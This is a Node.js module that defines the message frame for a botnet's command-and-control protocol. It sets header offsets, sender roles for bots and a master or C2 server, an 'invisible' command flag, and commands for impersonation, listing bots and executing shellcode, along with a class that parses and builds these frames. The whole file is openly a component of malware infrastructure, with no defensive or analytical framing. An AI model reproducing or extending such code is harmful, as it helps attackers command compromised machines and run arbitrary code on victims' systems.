const utils = require('./utils');

const MESSAGE_TYPE_POS        = 0;
const SEQUENCE_ID_POS         = 2;
const SENDER_TYPE_POS         = 6;
const TARGET_FINGERPRINT_POS  = 8;
const COMMAND_FLAGS_POS       = 12;
const RESERVED_FIELD_POS      = 14;
const STATUS_CODE_POS         = 16;
const COMMAND_ID_POS          = 18;
const SENDER_SIGNATURE_POS    = 20;
const TIMESTAMP_POS           = 24;

const MessageType = {
  QUERY: 0x01,
  RESPONSE: 0x02
};

const SenderType = {
  BOT: 0x01,
  MASTER: 0x7f,
  COMMAND_CONTROL: 0xff
};

const CommandFlags = {
  INVISIBLE: 0x01,
  VISIBLE:   0x02,
  MAXIMIZED: 0x04,
  MINIMIZED: 0x08
};

const StatusCode = {
  QUERY_SENT: 0x01,
  QUERY_AND_WAIT: 0x02,
  QUERY_INFO: 0x04,
  RESPONSE_SENT: 0x08,
  RESPONSE_WAIT_FRAGMENT: 0x10,
  RESPONSE_INFO: 0x20,
  ERROR_STATUS: 0x40
};

const CommandID = {
  IMPERSONATE: 0x01,
  DEPERSONATE: 0x02,
  HELP: 0x04,
  LIST_BOTS: 0x08,
  EXECUTE_SHELLCODE: 0x10,
};

class BotnetFrame {

  constructor(rawBytes){
    if (rawBytes.byteLength <= 32)
      throw new Error('Invalid frame received! The frame doesnt contain a payload data section.');
    this.frameHeaderBuffer = Buffer.alloc(32, 0);
    this.payloadBuffer = Buffer.alloc(rawBytes.byteLength - 32, 0, 'utf-8');
    rawBytes.copy(this.frameHeaderBuffer, 0, 0, 32);
    rawBytes.copy(this.payloadBuffer, 0, 32, rawBytes.byteLength);
  }
  
  get MessageType()       { return utils.readUint16(this.frameHeaderBuffer, MESSAGE_TYPE_POS);       }
  get SequenceID()        { return utils.readUint32(this.frameHeaderBuffer, SEQUENCE_ID_POS);        }
  get SenderType()        { return utils.readUint16(this.frameHeaderBuffer, SENDER_TYPE_POS);        }
  get TargetFingerprint() { return utils.readUint32(this.frameHeaderBuffer, TARGET_FINGERPRINT_POS); }
  get CommandFlags()      { return utils.readUint16(this.frameHeaderBuffer, COMMAND_FLAGS_POS);      }
  get ReservedField()     { return utils.readUint16(this.frameHeaderBuffer, RESERVED_FIELD_POS);     }
  get StatusCode()        { return utils.readUint16(this.frameHeaderBuffer, STATUS_CODE_POS);        }
  get CommandID()         { return utils.readUint16(this.frameHeaderBuffer, COMMAND_ID_POS);         }
  get SenderSignature()   { return utils.readUint32(this.frameHeaderBuffer, SENDER_SIGNATURE_POS);   }
  get Timestamp()         { return utils.readUint64(this.frameHeaderBuffer, TIMESTAMP_POS);          }
  get Payload()           { return this.payloadBuffer.toString('utf-8');                             }

  static build(MType, SeqID, SType, TargFingerprint, CFlags, Reserved, StatusCode, CommandID, SenderSig, PayloadData){
    let FrameHeaderBuffer = [
      utils.readUintNAsBuffer(16, Number(MType)),
      utils.readUintNAsBuffer(32, Number(SeqID)),
      utils.readUintNAsBuffer(16, Number(SType)),
      utils.readUintNAsBuffer(32, Number(TargFingerprint)),
      utils.readUintNAsBuffer(16, Number(CFlags)),
      utils.readUintNAsBuffer(16, Number(Reserved)),
      utils.readUintNAsBuffer(16, Number(StatusCode)),
      utils.readUintNAsBuffer(16, Number(CommandID)),
      utils.readUintNAsBuffer(32, Number(SenderSig)),
      utils.readUintNAsBuffer(64, Number(+new Date / 1000 | 0))
    ];
    return new BotnetFrame(Buffer.concat( [Buffer.concat(FrameHeaderBuffer), Buffer.from(PayloadData, 'utf-8')] ));
  }

  get Bytes(){
    return Buffer.concat([
      this.frameHeaderBuffer,
      this.payloadBuffer
    ]);
  }

}

module.exports = {
  BotnetFrame,
  MessageType,
  SenderType,
  CommandFlags,
  StatusCode,
  CommandID
}